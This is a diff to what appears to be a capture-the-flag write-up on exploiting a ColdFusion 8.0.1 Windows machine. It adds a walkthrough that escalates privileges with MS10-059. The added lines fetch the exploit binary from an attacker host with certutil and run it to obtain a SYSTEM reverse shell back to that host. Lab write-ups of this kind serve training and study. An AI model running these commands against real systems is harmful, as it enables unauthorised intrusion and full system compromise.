@@ -99,7 +99,7 @@
     Payload size: 1498 bytes
 
 
-#### == Upload reverse shell payload: way 1 ==
+### == Upload reverse shell payload: way 1 ==
 
 // When we was searching for exploits with searsploit i notice ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)
 
@@ -141,7 +141,7 @@
     listening on [any] 1444 ...
 
 
-#### == Upload reverse shell payload: way 2 ==
+### == Upload reverse shell payload: way 2 ==
 
 // Digging the administrator dashboed we see option called Scheduled Tasks there we can upload a New Tasks in the Schedule Tasks
 
@@ -286,16 +286,41 @@
     [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
     [*] done
 
-// Lets focuse on ms10-059(called [Chimichurri](https://itm4n.github.io/chimichurri-reloaded/))
+// Lets focuse on ms10-059
 
     [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
 
-------------------------------
-----------------------------------
--------------------------------
+// Download the [ms10-059.exe](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe)
 
-https://github.com/abatchy17/WindowsExploits/blob/master/MS10-059%20-%20Chimichurri/MS10-059.exe
+	C:\Users\tolis\Desktop\tmp> certutil.exe -urlcache -split -f http://10.10.17.8/MS10-059.exe
+	****  Online  ****
+	  000000  ...
+	  0bf800
+	CertUtil: -URLCache command completed successfully.
 
+-------
+
+	C:\Users\tolis\Desktop\tmp> dir
+	 Volume in drive C has no label.
+	 Volume Serial Number is F88F-4EA5
+
+	 Directory of C:\Users\tolis\Desktop\tmp
+
+	07/08/2021  09:55 ��    <DIR>          .
+	07/08/2021  09:55 ��    <DIR>          ..
+	07/08/2021  09:58 ��           784.384 ms10-059.exe
+		       1 File(s)        784.384 bytes
+		       2 Dir(s)  33.180.422.144 bytes free
+
+// Run ms10-059.exe with <IP> & <PORT>
+
+	C:\Users\tolis\Desktop\tmp> ms10-059.exe 10.10.17.8 443
+	/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
+
+	
+	
+	
+///ss
 
 
 
